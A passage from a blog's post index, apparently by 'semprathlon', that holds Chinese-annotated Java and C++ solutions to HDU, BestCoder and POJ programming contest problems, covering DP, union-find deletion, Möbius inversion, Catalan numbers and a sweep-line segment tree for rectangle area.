out.flush(); out.close(); } } Jam’s maze仔细检查数据范围，发现不是搜索而是DP。 为了找到回文串，从两个方向同步进行可以提高效率。由于串的走向只有向下与向右两个方向，借助“步数”参数，可以简化状态的表示，用行号代替坐标。 由于状态转移的特征，存储状态时“步数”参数可以借助滚动数组的方式消除。最后$latex O(n^2) $的空间复杂度就能满足使用。 /** * Mar 1, 2016 7:18:49 PM * PrjName: hdu5617 * @semprathlon */ import java.io.*; import java.util.*; public class Main { final static int mod = 5201314; static char[][] g; static int[][][] f; static int n; public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- > 0) { n = in.nextInt(); g = new char[n + 2][n + 2]; f = new int[2][n + 2][n + 2]; for (int i = 1; i &lt;= n; i++) { String str = in.next(); for (int j = 0; j &lt; n; j++) g[i][j + 1] = str.charAt(j); } int cur = 0; f[cur][1][n] = (g[1][1] == g[n][n] ? 1 : 0); for (int k = 1; k &lt;= n - 1; k++) { cur ^= 1; for (int i = 1; i &lt;= k + 1; i++) for (int j = 1; j &lt;= k + 1; j++) { int x1 = i, x2 = n - j + 1; int y1 = k - x1 + 2, y2 = 2 * n - k - x2; if (g[x1][y1] == g[x2][y2]) { f[cur][x1][x2] = f[cur ^ 1][x1][x2]; f[cur][x1][x2] += f[cur ^ 1][x1 - 1][x2];f[cur][x1][x2] %= mod; f[cur][x1][x2] += f[cur ^ 1][x1][x2 + 1];f[cur][x1][x2] %= mod; f[cur][x1][x2] += f[cur ^ 1][x1 - 1][x2 + 1];f[cur][x1][x2] %= mod; } else f[cur][x1][x2] = 0; } } int ans = 0; for (int i = 1; i &lt;= n; i++) { ans += f[cur][i][i]; ans %= mod; } out.println(ans); } out.flush(); out.close(); } }","link":"/posts/561c3d53/"},{"title":"BestCoder","text":"已解决题目列表 KK’s Steel KK’s Point KK’s Number KK’s Steel本题……就是没有兼顾好均不能围成三角形和锯成的段尽量多。按公比为2的等比数列切割可以保证不围成三角形，但是Fibonacci数列能使切割段更短。 计算出数列的前若干项后，再二分查找合适的前n项和。 /** * Mar 5, 2016 11:17:28 AM * PrjName: hdu5620 * @semprathlon */ import java.io.*; import java.util.*; public class Main { final static long maxs = 1000000000000000000L; static Vector&lt;Long> v = new Vector&lt;>(); static void init() { v.add(1L); v.add(2L); long a=1L,b=2L,c = 3L,s=6L; while(s&lt;=maxs){ v.add(s); a=b;b=c;c=a+b;s+=c; }; } static int bsearch(Vector&lt;Long> v, long key) { int l = 0, r = v.size()-1; while (l &lt; r) { int m = (l + r + 1) >> 1; if (v.get(m)==key) return m+1; else if (v.get(m) > key) r = m - 1; else l = m; } return l+1; } public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); init(); int T = in.nextInt(); while (T-- > 0) { long n = in.nextLong(); int ans = (n>2L)?bsearch(v, n) :1; /*if (ans&lt;v.size()-1&&v.get(ans+1)-n&lt;n-v.get(ans)) ans++;*/ out.println(ans); } out.flush(); out.close(); } } KK’s Point在画线的时候想到，圆内的任意一个交点可以由两条相交线段确定，两条相交线段又由圆上的四个不共线的点确定。所以枚举四个点的组合($latex x_1,x_2,x_3,x_4$)（线段$latex x_1 x_3$与$latex x_2 x_4$交于某点），能够枚举出圆内所有交点（有$latex C_n^4$个）。 作乘除运算时特殊处理的原因：Java不存在unsinged long类型，四个数相乘会超出long的范围。为避免使用BigInteger，写成乘除交替的形式。但是n的奇偶会改变n-1,n-2,n-3所包含的因子，所以调整乘的顺序以保证整除的准确性。 /** * Mar 8, 2016 7:48:03 PM * PrjName: hdu5621 * @semprathlon */ import java.io.*; import java.util.*; public class Main { public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T-->0){ long n=in.nextLong(); if ((n&1L)>0L) out.println(n+(n-1L)*(n-2L)*(n-3L)/12L*n/2L); else out.println(n+n*(n-1L)*(n-2L)/12L*(n-3L)/2L); } out.flush(); out.close(); } } 假如有unsinged long，那么n+n*(n-1L)*(n-2L)/6L*(n-3L)/4L就行了。 KK’s Number一定要划分好状态，确定状态参数的意义。博弈DP包含了先手与后手的交替转换。 /** * Mar 8, 2016 3:06:16 PM * PrjName: hdu5623 * @semprathlon */ import java.io.*; import java.util.*; public class Main { static int[] a; static int solve(int n){ int tmp=0; for(int i=0;i&lt;n;i++) tmp=Math.max(tmp, a[i]-tmp); return tmp; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T-->0){ int n=in.nextInt(); a=new int[n]; for(int i=1;i&lt;=n;i++) a[i-1]=in.nextInt(); Arrays.sort(a); out.println(solve(n)); } out.flush(); out.close(); } }","link":"/posts/561c3d53/"},{"title":"BestCoder","text":"已解决题目列表 Clarke and chemistry Clarke and points Clarke and chemistry/** * Feb 13, 2016 7:01:48 PM * PrjName: Bc72-01 * @semprathlon */ import java.io.*; import java.util.*; public class Main { static int maxc=26; static int f[][]=new int[3][maxc]; static boolean check1(int a,int c,int x){ for(int i=0;i&lt;maxc;i++){ if (f[a][i]&lt;1) continue; if (f[a][i]*x>f[c][i]) return false; } return true; } static int check2(int a,int b,int c,int x,int y){ int res=0; for(int i=0;i&lt;maxc;i++){ if (f[a][i]*x+f[b][i]*y>f[c][i]) return 1; if (f[a][i]*x+f[b][i]*y&lt;f[c][i]) res=-1; } return res; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T-->0){ int a=in.nextInt(); int b=in.nextInt(); int c=in.nextInt(); for(int i=0;i&lt;maxc;i++) f[0][i]=f[1][i]=f[2][i]=0; for(int i=1;i&lt;=a;i++){ String str=in.next(); char ch=str.charAt(0); f[0][ch-'A']=in.nextInt(); } for(int i=1;i&lt;=b;i++){ String str=in.next(); char ch=str.charAt(0); f[1][ch-'A']=in.nextInt(); } for(int i=1;i&lt;=c;i++){ String str=in.next(); char ch=str.charAt(0); f[2][ch-'A']=in.nextInt(); } int ansx=0,ansy=0; for(int x=1;x&lt;=100;x++){ if (!check1(0, 2, x)||ansx>0&&ansy>0) break; for(int y=1;y&lt;=100;y++) if (check2(0, 1, 2, x, y)==0){ ansx=x;ansy=y;break; } } if (ansx>0&&ansy>0) out.println(ansx+\" \"+ansy); else out.println(\"NO\"); } out.flush(); out.close(); } } Clarke and points据POJ上一道老题的提示，在处理曼哈顿距离的计算式时要设法去绝对值，即枚举+-运算符各种组合（枚举量也不大）。以原点为参考点，求各点到原点的曼哈顿距离相当于将各点映射到一维坐标上，且能从中得到最小值与最大值，就能找到最远距离。为节省内存开支，采用在线算法。 /** * Feb 13, 2016 7:25:26 PM * PrjName: Bc72-02 * @semprathlon */ import java.io.*; import java.util.*; public class Main { static long sd, seed; final static long inf = 0x7ffffffffffL; static long solve(int n) { long ans = 0, mi, mx, t; for (int s = 0; s &lt; 4; s++) { mi = inf; mx = -inf; sd = seed; for (int i = 0; i &lt; n; i++) { t = 0; long t0 = rand(-1000000000, 1000000000); long t1 = rand(-1000000000, 1000000000); if ((1 & s) > 0) t += t0; else t -= t0; if ((2 & s) > 0) t += t1; else t -= t1; mi = Math.min(mi, t); mx = Math.max(mx, t); } ans = Math.max(ans, mx - mi); } return ans; } static long rand(long l, long r) { long mo = 1000000000L + 7, g = 78125L; sd *= g; return l + (sd %= mo) % (r - l + 1); } public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- > 0) { int n = in.nextInt(); sd = in.nextLong(); seed = sd; out.println(solve(n)); } out.flush(); out.close(); } }","link":"/posts/561c3d53/"},{"title":"BestCoder","text":"已解决题目列表 King’s Cake King’s Phone King’s Order King’s Game King’s Cake怎样转化成最大公约数？ King’s Phone如果出现了超范围的键码就直接判为非法数据。两键连线上的键不可直接跨越，但是若已经被连过就可以跨越。 /** * Mar 12, 2016 7:13:10 PM * PrjName: Bc75-02 * @semprathlon */ import java.io.*; import java.util.*; public class Main { static int[] a=new int[10]; static int[][] f=new int[10][10]; static boolean[] v=new boolean[10]; static int n; static void init(){ f[2][8]=f[8][2]=f[4][6]=f[6][4]=f[1][9]=f[9][1]=f[3][7]=f[7][3]=5; f[1][3]=f[3][1]=2; f[7][9]=f[9][7]=8; f[1][7]=f[7][1]=4; f[3][9]=f[9][3]=6; } static boolean check0(){ for(int i=1;i&lt;=n;i++) if (a[i]&lt;1||a[i]>9) return false; return true; } static boolean check1(){ for(int i=1;i&lt;=n;i++) for(int j=i+1;j&lt;=n;j++) if (a[i]==a[j]) return false; return true; } static boolean check2(){ for (int i=1;i&lt;n;i++){ if (f[a[i]][a[i+1]]>0&&!v[f[a[i]][a[i+1]]]) return false; v[a[i]]=true; } return true; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); init(); int T=in.nextInt(); while(T-->0){ n=in.nextInt(); int cnt=0; for(int i=1;i&lt;=n;i++){ Arrays.fill(v, false); if (!check0()||n&lt;4||!check1()||!check2()) out.println(\"invalid\"); else out.println(\"valid\"); } out.flush(); out.close(); } } King’s Order状态转移应该是简化的。 * Mar 12, 2016 7:37:46 PM * PrjName: Bc75-03 * @semprathlon */ import java.io.*; import java.util.*; public class Main { final static int maxn=2010; static long[][] f=new long[maxn][10]; final static long mod=1000000007L; static void init(){ f[1][0]=26; for(int i=2;i&lt;maxn;i++){ f[i][0]+=f[i-1][0]*25L%mod;f[i][0]%=mod; f[i][0]+=f[i-1][1]*25L%mod;f[i][0]%=mod; f[i][0]+=f[i-1][2]*25L%mod;f[i][0]%=mod; f[i][1]+=f[i-1][0];f[i][1]%=mod; f[i][2]+=f[i-1][1];f[i][2]%=mod; } } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); init(); int T=in.nextInt(); while(T-->0){ int n=in.nextInt(); long ans=f[n][0]+f[n][1];ans%=mod; ans+=f[n][2];ans%=mod; out.println(ans); } out.flush(); out.close(); } } King’s Game经典的约瑟夫游戏规律公式的变式。 /** * Mar 12, 2016 8:46:47 PM * PrjName: Bc75-04 * @semprathlon */ import java.io.*; import java.util.*; public class Main { public static int awayOrder(int n) { int res=0; for(int i=2;i&lt;=n;i++) res=(res+n-i+1)%i; return res+1; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T-->0){ int n=in.nextInt(); out.println(awayOrder(n)); } out.flush(); out.close(); } }","link":"/posts/561c3d53/"},{"title":"BestCoder","text":"已解决题目列表 xiaoxin juju needs help India and China Origins xiaoxin juju needs helpimport java.io.*; import java.util.*; public class Main { static int[] f=new int[26]; final static long mod=1000000007; final static int maxn=1010; static long pow_mod(long n, long m, long mod) { long res = 1L; n %= mod; while (m &gt; 0L) { if ((m & 1L) &gt; 0L) res = res * n % mod; n = n * n % mod; m &gt;&gt;= 1; } return res; } static long div_mod(long n, long m, long mod) { return n * pow_mod(m, mod - 2, mod) % mod; // return n * pow_mod(m, phi[mod] - 1, mod) % mod; } static long fac(long n,long mod){ long res=1; for(int i=2;i&lt;=n;i++) res=res*(long)i%mod; return res; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&gt;0){ String s=new String(in.next()); Arrays.fill(f, 0); for(int i=0;i&lt;s.length();i++){ f[s.charAt(i)-'a']++; } int cnt=0; for(int i=0;i&lt;26;i++) if ((f[i]&1)&gt;0) cnt++; if (cnt&gt;1){ out.println(0);continue; } long ans=fac(s.length()/2, mod); for(int i=0;i&lt;26;i++){ ans=div_mod(ans, fac(f[i]/2, mod), mod); } out.println(ans); } out.flush(); out.close(); } } India and China Origins做这题的初期，全俱乐部的人都在想着如何通过执行DFS或者BFS后尽快求得“最早时间”。写二分答案时也是带进了这种想法，希望加入时间参数并搜索后能返回一个时间值，结果把搜索写冗杂了还超时。实际DFS或者BFS只需返回是否走通就够了，效率也很高。这次也是意识到，BFS可以是多起点的。DFS用时反而少于BFS？ DFS import java.io.*; import java.util.*; public class Main { static int n,m; static int[][] f,g; static boolean can(int x,int y){ return x&gt;=0&&x&lt;n&&y&gt;=0&&y&lt;m; } static int[][] dir={ {-1,0},{1,0},{0,-1},{0,1}}; static boolean[][] vis; static boolean dfs(int x,int y,int q){ if (x==0) return f[x][y]==0||f[x][y]&gt;q; if (f[x][y]==0||f[x][y]&gt;q) for(int k=0;k&lt;4;k++){ int dx=x-dir[k][0]; int dy=y+dir[k][1]; if (can(dx,dy)&&!vis[dx][dy]){ vis[dx][dy]=true; if (dfs(dx,dy,q)) return true; } } return false; } static boolean scan(int q){ vis=new boolean[n][m]; for(int j=0;j&lt;m;j++) if (!vis[n-1][j]){ if (dfs(n-1,j,q)) return true; } return false; } static int bisearch(int q){ int l=0,r=q; while(l&lt;r){ int mid=(l+r)&gt;&gt;1; if (scan(mid)) l=mid+1; else r=mid; } return l; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&gt;0){ n=in.nextInt(); m=in.nextInt(); f=new int[n][m]; for(int i=0;i&lt;n;i++){ String s=in.next(); for(int j=0;j&lt;m;j++) if (s.charAt(j)=='1') f[i][j]=-1; } int q=in.nextInt(); for(int i=1;i&lt;=q;i++){ int x=in.nextInt(); int y=in.nextInt(); f[x][y]=i; } /*for(int i=0;i&lt;=q;i++) out.println(i+\":\"+scan(i));*/ int ans=scan(q)?-1:(bisearch(q)); out.println(ans); //out.println(check(ans)); } out.flush(); out.close(); } } BFS import java.io.*; import java.util.*; public class Main { static int n,m; static int[][] f,g; static boolean can(int x,int y){ return x&gt;=0&&x&lt;n&&y&gt;=0&&y&lt;m; } static int[][] dir={ {-1,0},{1,0},{0,-1},{0,1}}; static boolean[][] vis; static Queue&lt;Pt&gt; que=new LinkedList&lt;Pt&gt;(); static boolean bfs(int q){ que.clear(); for(int j=0;j&lt;m;j++) if (f[n-1][j]==0||f[n-1][j]&gt;q) { que.add(new Pt(n-1,j)); vis[n-1][j]=true; } while(!que.isEmpty()){ Pt p=que.poll(); if (p.x==0){ if (f[p.x][p.y]==0||f[p.x][p.y]&gt;q) return true; else continue; } if (f[p.x][p.y]==0||f[p.x][p.y]&gt;q) for(int k=0;k&lt;4;k++){ int dx=p.x+dir[k][0]; int dy=p.y+dir[k][1]; if (can(dx,dy)&&!vis[dx][dy]){ vis[dx][dy]=true; que.add(new Pt(dx,dy)); } } } return false; } static boolean scan(int q){ vis=new boolean[n][m]; return bfs(q); } static int check(int k){ boolean x=scan(k-1); boolean y=scan(k); if (x&&!y) return 0; if (!x&&!y) return 1; return -1; } static int bisearch(int q){ int l=0,r=q; while(l&lt;r){ int mid=(l+r)&gt;&gt;1; if (scan(mid)) l=mid+1; else r=mid; } return l; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&gt;0){ n=in.nextInt(); m=in.nextInt(); f=new int[n][m]; for(int i=0;i&lt;n;i++){ String s=in.next(); for(int j=0;j&lt;m;j++) if (s.charAt(j)=='1') f[i][j]=-1; } int q=in.nextInt(); for(int i=1;i&lt;=q;i++){ int x=in.nextInt(); int y=in.nextInt(); f[x][y]=i; } /*for(int i=0;i&lt;=q;i++) out.println(i+\":\"+scan(i));*/ int ans=scan(q)?-1:(/*!scan(0)?0:0*/bisearch(q)); out.println(ans); //out.println(check(ans)); } out.flush(); out.close(); } } class Pt{ int x,y; Pt(){} Pt(int _x,int _y){ x=_x;y=_y; } }","link":"/posts/561c3d53/"},{"title":"hdu 2473 Junk-Mail Filter 并查集的删除操作","text":"#Junk-Mail Filter Time Limit: 15000/8000 MS (Java/Others)Memory Limit: 32768/32768 K (Java/Others) ##Problem Description Recognizing junk mails is a tough task. The method used here consists of two steps: 1) Extract the common characteristics from the incoming email.2) Use a filter matching the set of common characteristics extracted to determine whether the email is a spam. We want to extract the set of common characteristics from the N sample junk emails available at the moment, and thus having a handy data-analyzing tool would be helpful. The tool should support the following kinds of operations: a) “M X Y”, meaning that we think that the characteristics of spam X and Y are the same. Note that the relationship defined here is transitive, sorelationships (other than the one between X and Y) need to be created if they are not present at the moment. b) “S X”, meaning that we think spam X had been misidentified. Your tool should remove all relationships that spam X has when this command is received; after that, spam X will become an isolated node in the relationship graph. Initially no relationships exist between any pair of the junk emails, so the number of distinct characteristics at that time is N.Please help us keep track of any necessary information to solve our problem. ##Input There are multiple test cases in the input file.Each test case starts with two integers, N and M (1 ≤ N ≤ 10^5 , 1 ≤ M ≤ 10^6), the number of email samples and the number of operations. M lines follow, each line is one of the two formats described above.Two successive test cases are separated by a blank line. A case with N = 0 and M = 0 indicates the end of the input file, and should not be processed by your program. ##Output For each test case, please print a single integer, the number of distinct common characteristics, to the console. Follow the format as indicated in the sample below. ##Sample Input 5 6M 0 1M 1 2M 1 3S 1M 1 2S 3 3 1M 1 2 0 0 ##Sample Output Case #1: 3Case #2: 2 #Source 2008 Asia Regional Hangzhou 要删除结点时，原结点的编号作废但保留位置，再给该结点新分配一个“马甲”。 /** * Mar 28, 2016 8:25:14 PM * PrjName: fzu2155 * @semprathlon */ import java.io.*; import java.util.*; public class Main { final static int maxn = 2000010; static int[] f = new int[maxn]; static int[] g = new int[maxn]; static int n, m, cnt; static Set&lt;Integer&gt; st = new HashSet&lt;Integer&gt;(); static int getf(int x) { if (f[x] == x) return x; f[x] = getf(f[x]); return f[x]; } static boolean unite(int x, int y) { int a = getf(g[x]); int b = getf(g[y]); if (a == b) return false; f[a] = b; return true; } static void init() { cnt = n; for (int i = 0; i &lt; n + m; i++) f[i] = i; for (int i = 0; i &lt; n; i++) g[i] = i; } public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int cas = 0; while (in.nextLine() != null) { n = in.nextInt(); m = in.nextInt(); if (n == 0 &amp;&amp; m == 0) break; init(); for (int i = 1; i &lt;= m; i++) { String s = in.next(); if (s.charAt(0) == 'M') { int x = in.nextInt(); int y = in.nextInt(); unite(x, y); } else if (s.charAt(0) == 'S') { int x = in.nextInt(); g[x] = cnt++; } } st.clear(); for (int i = 0; i &lt; n; i++) st.add(getf(g[i])); out.println(\"Case #\" + (++cas) + \": \" + st.size()); } out.flush(); out.close(); } } class InputReader { public BufferedReader reader; public StringTokenizer tokenizer; public InputReader(InputStream stream) { reader = new BufferedReader(new InputStreamReader(stream), 32768); tokenizer = null; } public String nextLine() { String tmp = null; try { tmp = reader.readLine(); tokenizer = new StringTokenizer(tmp); } catch (IOException e) { throw new RuntimeException(e); } catch (NullPointerException e) { return null; } return tmp; } public String next() { while (tokenizer == null || !tokenizer.hasMoreTokens()) { try { tokenizer = new StringTokenizer(reader.readLine()); } catch (IOException e) { throw new RuntimeException(e); } } return tokenizer.nextToken(); } public int nextInt() { return Integer.parseInt(next()); } public long nextLong() { return Long.parseLong(next()); } public double nextDouble() { return Double.parseDouble(next()); } }","link":"/posts/90576153/"},{"title":"hdu 1695 GCD 数论教学题","text":"GCDTime Limit: 6000/3000 MS (Java/Others)Memory Limit: 32768/32768 K (Java/Others) Problem Description Given 5 integers: a, b, c, d, k, you’re to find x in a…b, y in c…d that GCD(x, y) = k. GCD(x, y) means the greatest common divisor of x and y. Since the number of choices may be very large, you’re only required to output the total number of different number pairs.Please notice that, (x=5, y=7) and (x=7, y=5) are considered to be the same. You can assume that a = c = 1 in all test cases. Input The input consists of several test cases. The first line of the input is the number of the cases. There are no more than 3,000 cases.Each case contains five integers: a, b, c, d, k, 0 &lt; a &lt;= b &lt;= 100,000, 0 &lt; c &lt;= d &lt;= 100,000, 0 &lt;= k &lt;= 100,000, as described above. Output For each test case, print the number of choices. Use the format in the example. Sample Input 21 3 1 5 11 11014 1 14409 9 Sample Output Case 1: 9Case 2: 736427 Hint For the first sample input, all the 9 pairs of numbers are (1, 1), (1, 2), (1, 3), (1, 4), (1, 5), (2, 3), (2, 5), (3, 4), (3, 5). 莫比乌斯反演，可比容斥原理节省工作量。 所需寻找的二元组中i==j时，仅算1对。 import java.io.*; import java.util.*; public class Main { final static int maxn=100010; static int[] pri,phi,fstp,miu; static void get_prime(){ pri=new int[maxn]; fstp=new int[maxn]; phi=new int[maxn]; miu=new int[maxn]; phi[1]=1; miu[1]=1; for(int i=2;i&lt;maxn;i++){ if (fstp[i]==0){ pri[++pri[0]]=i; phi[i]=i-1; miu[i]=-1; } for(int j=1;j&lt;=pri[0]&amp;&amp;i*pri[j]&lt;maxn;j++){ int k=i*pri[j]; fstp[k]=pri[j]; //if (fstp[i]==pri[j]){ if (i%pri[j]==0){ phi[k]=phi[i]*pri[j]; miu[k]=0; break; } else{ phi[k]=phi[i]*(pri[j]-1); miu[k]=-miu[i]; } } } } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; get_prime(); while(T--&gt;0){ in.nextInt(); int n=in.nextInt(); in.nextInt(); int m=in.nextInt(); int k=in.nextInt(); if (k==0){ out.println(\"Case \"+(++cas)+\": 0\"); continue; } n/=k;m/=k; if (n&gt;m){ int t=n;n=m;m=t; } long ans=0; for(int i=1;i&lt;=n;i++) ans-=(long)miu[i]*(n/i)*(n/i); ans/=2; for(int i=1;i&lt;=n;i++) ans+=(long)miu[i]*(n/i)*(m/i); out.println(\"Case \"+(++cas)+\": \"+ans); } out.flush(); out.close(); } }","link":"/posts/db17a9ea/"},{"title":"hdu 4828 Grids Catalan数例题","text":"#Grids Time Limit: 10000/5000 MS (Java/Others)Memory Limit: 65535/65535 K (Java/Others) ##Problem Description 度度熊最近很喜欢玩游戏。这一天他在纸上画了一个2行N列的长方形格子。他想把1到2N这些数依次放进去，但是为了使格子看起来优美，他想找到使每行每列都递增的方案。不过画了很久，他发现方案数实在是太多了。度度熊想知道，有多少种放数字的方法能满足上面的条件？ ##Input 第一行为数据组数T(1&lt; =T&lt;=100000)。 然后T行，每行为一个数N(1&lt; =N&lt;=1000000)表示长方形的大小。 ##Output 对于每组数据，输出符合题意的方案数。由于数字可能非常大，你只需要把最后的结果对1000000007取模即可。 ##Sample Input 213 ##Sample Output Case #1:1Case #2:5 ##Hint 对于第二组样例，共5种方案，具体方案为： ##Source 2014年百度之星程序设计大赛 - 初赛（第一轮） 引用维基百科的解释： Cn is the number of standard Young tableaux whose diagram is a 2-by-n rectangle. In other words, it is the number of ways the numbers 1, 2, …, 2n can be arranged in a 2-by-n rectangle so that each row and each column is increasing. As such, the formula can be derived as a special case of the hook-length formula. 除法取模运算、Catalan数计算依赖于不同的推导，分别有多种不同写法，分别有不同的时间复杂度表现。 /** * Apr 3, 2016 9:54:01 PM * PrjName: hdu4828 * @semprathlon */ import java.io.*; import java.util.*; public class Main { final static int maxn = 1000010, mod = 1000000007; static long inv[] = new long[maxn]; static long a[] = new long[maxn]; static long b[] = new long[maxn]; static long C[] = new long[maxn]; static long x, y; static void extgcd(long a, long b) { if (b == 0L) { x = 1L; y = 0L; return; } extgcd(b, a % b); long t = x; x = y; y = t - a / b * y; } static void get_inv(int maxn, long mod) { inv[1] = 1; for (int i = 2; i &lt; maxn; i++) { // inv[i] = (mod - mod / i) * inv[(int) (mod % i)] % mod; inv[i] = (int) cal_inv(i, mod); } } static long cal_inv(long n, long mod) { extgcd(n, mod); return x &lt; 0L ? (x + mod) % mod : x % mod; } static long pow_mod(long n, long m, long mod) { long res = 1L; n %= mod; while (m &gt; 0L) { if ((m &amp; 1L) &gt; 0L) res = res * n % mod; n = n * n % mod; m &gt;&gt;= 1; } return res; } static long div_mod(long n, long m, long mod) { // return n * pow_mod(m, mod - 2, mod) % mod; // return n * pow_mod(m, phi(mod) - 1, mod) % mod; return n * inv[(int) m] % mod; } static void get_Catalan(int maxn) { a[1] = 2; b[1] = 1; C[1] = 1; for (int i = 2; i &lt; maxn - 1; i++) { /* * a[i] = a[i - 1] * ((i &lt;&lt; 1) - 1) % mod * (i &lt;&lt; 1) % mod; a[i] = * div_mod(a[i], i, mod); a[i] = div_mod(a[i], i, mod); b[i] = b[i - * 1] * ((i &lt;&lt; 1) - 1) % mod * (i &lt;&lt; 1) % mod; b[i] = div_mod(b[i], * i + 1, mod); b[i] = div_mod(b[i], i - 1, mod); C[i] = a[i] - * b[i]; if (C[i] &lt; 0) C[i] += mod; */ C[i] = C[i - 1] * ((i &lt;&lt; 2) - 2) % mod; C[i] = div_mod(C[i], i + 1, mod); } } public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); get_inv(maxn, mod); get_Catalan(maxn); int T = in.nextInt(), cas = 0; while (T-- &gt; 0) { int n = in.nextInt(); out.println(\"Case #\" + (++cas) + \":\"); out.println(C[n]); } out.flush(); out.close(); } }","link":"/posts/a6ec002a/"},{"title":"BestCoder","text":"","link":"/posts/561c3d53/"},{"title":"POJ 1151 &#x2F; hdu 1828 矩形面积并 扫描线+线段树","text":"应将线段树存储区间对应于矩形边的区段。 /* * File: main.cpp * Author: semprathlon * * Created on April 9, 2016, 10:19 AM */ #include &lt;cstdio&gt; #include &lt;cmath&gt; #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;algorithm&gt; using namespace std; struct Rectangle{ double x1,y1,x2,y2; Rectangle(){} Rectangle(double _x1,double _y1,double _x2,double _y2):x1(_x1),x2(_x2),y1(_y1),y2(_y2){} }; vector&lt;Rectangle&gt; rects; vector&lt;double&gt; ys; struct SegTree{ SegTree *lchild,*rchild; int l,r,m; double s; int w; SegTree(){} SegTree(int _l,int _r):l(_l),r(_r){ m=(l+r)&gt;&gt;1;w=0;s=0; if (l&lt;r){ lchild=new SegTree(l,m); rchild=new SegTree(m+1,r); } } void up(){ if (w&gt;0) s=lchild-&gt;s+rchild-&gt;s; } void down(){ if (w&gt;0){ lchild-&gt;w+=w; rchild-&gt;w+=w; if (lchild-&gt;w) lchild-&gt;s=ys[lchild-&gt;r+1]-ys[lchild-&gt;l]; if (rchild-&gt;w) rchild-&gt;s=ys[rchild-&gt;r+1]-ys[rchild-&gt;l]; s=w=0; } } void modify(int x,int y,int v){ if (l==r){ w+=v; if (w&gt;0) s=ys[r+1]-ys[l]; else s=0; return; } if (x==l&amp;&amp;r==y){ w+=v; if (w&gt;0){ s=ys[r+1]-ys[l]; return; } else s=0; } down(); if (x&lt;=m) lchild-&gt;modify(x,min(m,y),v); if (y&gt;m) rchild-&gt;modify(max(m+1,x),y,v); up(); } double query(int x,int y){ //cout&lt;&lt;\"q \"&lt;&lt;x&lt;&lt;\",\"&lt;&lt;y&lt;&lt;\",\"&lt;&lt;w&lt;&lt;\",\"&lt;&lt;s&lt;&lt;endl; if (l==r) return w&gt;0?s:0; if (x==l&amp;&amp;r==y&amp;&amp;w&gt;0){ return s; } down(); double res=0; if (x&lt;=m) res+=lchild-&gt;query(x,min(m,y)); if (y&gt;m) res+=rchild-&gt;query(max(m+1,x),y); up(); return res; } } *T; bool cmp(const double&amp; a,const double&amp; b){ if (abs(a-b)&lt;1e-5) return 0; return a-b&lt;0; } double unionArea(const vector&lt;Rectangle&gt;&amp; rects){ if (rects.empty()) return 0; typedef pair&lt;double,pair&lt;int,int&gt; &gt; Event; vector&lt;Event&gt; events; ys.clear(); for(int i=0;i&lt;rects.size();++i){ ys.push_back(rects[i].y1); ys.push_back(rects[i].y2); events.push_back(Event(rects[i].x1,make_pair(1,i))); events.push_back(Event(rects[i].x2,make_pair(-1,i))); } sort(ys.begin(),ys.end()); ys.erase(unique(ys.begin(),ys.end()),ys.end()); // for(int i=0;i&lt;ys.size();i++) // cout&lt;&lt;ys[i]&lt;&lt;' ';cout&lt;&lt;endl; T=new SegTree(0,ys.size()-2); sort(events.begin(),events.end()); double res=0; // vector&lt;int&gt; cnt(ys.size()-1,0); for(int i=0;i&lt;events.size()-1;++i){ int delta=events[i].second.first; int rectangle=events[i].second.second; //update count[] int y1=lower_bound(ys.begin(),ys.end(),rects[rectangle].y1)-ys.begin(),y2=lower_bound(ys.begin(),ys.end(),rects[rectangle].y2)-ys.begin(); // cout&lt;&lt;y1&lt;&lt;' '&lt;&lt;y2&lt;&lt;' '&lt;&lt;ys[y1]&lt;&lt;' '&lt;&lt;ys[y2]&lt;&lt;' '&lt;&lt;delta&lt;&lt;endl; if (y1&gt;y2) swap(y1,y2); T-&gt;modify(y1,y2-1,delta); //for(int j=0;j&lt;ys.size()-1;j++) //T-&gt;query(j,j); //cout&lt;&lt;j&lt;&lt;\":\"&lt;&lt;T-&gt;query(j,j)&lt;&lt;endl; /*for(int j=0;j&lt;ys.size();++j) if (y1&lt;=ys[j]&amp;&amp;ys[j]&lt;y2) cnt[j]+=delta;*/ //count cutlength double cutLength=T-&gt;query(0,ys.size()-2); // cout&lt;&lt;cutLength&lt;&lt;' '&lt;&lt;(events[i+1].first-events[i].first)&lt;&lt;endl; if (i+1&lt;events.size()) res+=cutLength*(events[i+1].first-events[i].first); } return res; } int main(int argc, char** argv) { ios::sync_with_stdio(false); cout.setf(ios::fixed,ios::floatfield); cout.precision(2); int n,cas=0; while(cin&gt;&gt;n){ if (!n) break; rects.clear(); for(int i=0;i&lt;n;i++){ double x1,y1,x2,y2; cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2; rects.push_back(Rectangle(x1,y1,x2,y2)); } cout&lt;&lt;\"Test case #\"&lt;&lt;++cas&lt;&lt;endl; 